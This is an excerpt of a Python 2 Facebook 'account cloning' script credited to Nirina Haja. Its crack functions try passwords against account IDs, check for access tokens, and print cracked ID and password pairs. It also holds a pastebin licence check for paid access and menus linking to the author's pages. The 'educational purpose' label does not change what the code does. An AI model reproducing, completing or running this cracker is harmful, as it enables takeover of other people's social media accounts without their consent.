#Script Given By Nirina Offisialy

#Script Is Given For Educational Purpose

#Script Edited By @NirinaOffisialy
...
\__|  \__| \_______| \___$$$\|\__| $$$\| \_______|\__|      
...
\033[1;92mAuthor \033[1;93m: Haja Nirina

\033[1;92mFb \033[1;93m: Nirina_Offisialy

\033[1;92mSite \033[1;93m: https://nirinahaja.simplesite.com

\033[1;92mNote \033[1;93m: Tsy Tompon'andraikitra @ izay ataonareo izaho
...
def main():
    ...
    print ' \033[0m[4].\x1b[1;96m Subscribe To My Site '

    print ' \033[0m[5].\x1b[1;96m My Account Github '

    print ' \033[0m[6].\x1b[1;96m Group FB '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/Nirina.Offisialy')
        ...
        os.system('xdg-open https://youtube.com/channel/UCYe7sbHW1HfvkV4h-1Cdf-w')

        main()

    elif select == '4':

         os.system('xdg-open https://nirinahaja.simplesite.com')  
         ...
         os.system('xdg-open https://github.com/HajaNirina22') 
          ...
          os.system('xdg-open https://facebook.com/groups/tutomalagasynirina/')     
...
def crack():
    ...
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Nirina Haja.& Also Tutorial Malagasy
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks NirinaHaja
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks NirinaHaja.& Also Tutorial Malagasy
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks NirinaHaja & Also Tutorial Malagasy
...
#Thanks NirinaHaja & Also Tutorial Malagasy
...
def Token_token():
	...
	try:
		...
		r = requests.get("https://pastebin.com/raw/J4Prkxz8").text

		if dec in r:

			Token_token() 

#:add your main menu when payment sucess

		else:

		    print('\t  \033[1;91m Paste Your Token Please :(').center(50)
...
def not_reg():
    ...
    os.system('xdg-open https://t.me/+261345678212') #Telegram number here
